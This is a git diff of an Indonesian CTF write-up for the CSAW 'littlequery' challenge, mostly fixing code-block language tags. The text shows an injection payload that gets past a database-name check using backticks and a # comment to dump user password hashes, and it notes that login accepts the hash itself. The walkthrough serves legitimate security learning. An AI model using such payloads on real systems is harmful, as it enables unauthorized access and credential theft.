@@ -30,8 +30,7 @@ http://littlequery.chal.csaw.io
 
 Di source code pada halaman index kita bisa menemukan ada source yang di comment
 
-```
-html
+```html
 
 <!--
 <div class="col-md-4">
@@ -51,7 +50,8 @@ list available databases ditemukan ada database namanya `littlequery`, kemudian 
 ada pada database littlequery `http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema&db=littlequery`
 so kita dapat ada table `user`
 
-```
+```javascript
+
 {
     tables: [
         "user"
@@ -62,8 +62,7 @@ so kita dapat ada table `user`
 kemudian untuk melakukan list kolom pada table user gunakan `http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema&db=littlequery&table=user`
 dan di dapatkan
 
-```
-json
+```javascript
 
 {
     columns: {
@@ -82,8 +81,7 @@ tidak match dengan == "littlequery" kita bisa menggunakan # sebagai comment
 
 illustrasi kodingan yang digunakan adalah sebagai berikut
 
-```
-php
+```php
 
 $db = addslashes($_GET['db']);
 $table = addslashes($_GET['table']);
@@ -98,18 +96,18 @@ $query = "SELECT * from `".$db."`.".$table."`";
 kita bisa melakukan bypass dengan menggunakan payload sebagai berikut `http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&db=littlequery`.`user`%23&table=foobar`
 $query akan jadi seperti berikut 
 
-```
+```php
+
 SELECT * from `littlequery`.`user`#`foobar`
 
-query yang tereksekusi adalah => SELECT * from `littlequery`.`user`
+//query yang tereksekusi adalah => SELECT * from `littlequery`.`user`
 
 $db = "littlequery`.`user`#" // jadi kita gak kena deny lagi
 ```
 
 didapatkan user dan password yang di hash 
 
-```
-json
+```javascript
 
 [
     {
@@ -123,8 +121,7 @@ json
 kita tidak harus mencari plain-text dari SHA-1 tersebut karena website tersebut menerima login dengan
 hashed password bukan dengan plaintext password diketahui dari script yang ada di login.js
 
-```
-javascript
+```javascript
 
 $(".form-signin").submit(function () {
     var $password = $(this).find("input[type=password]");
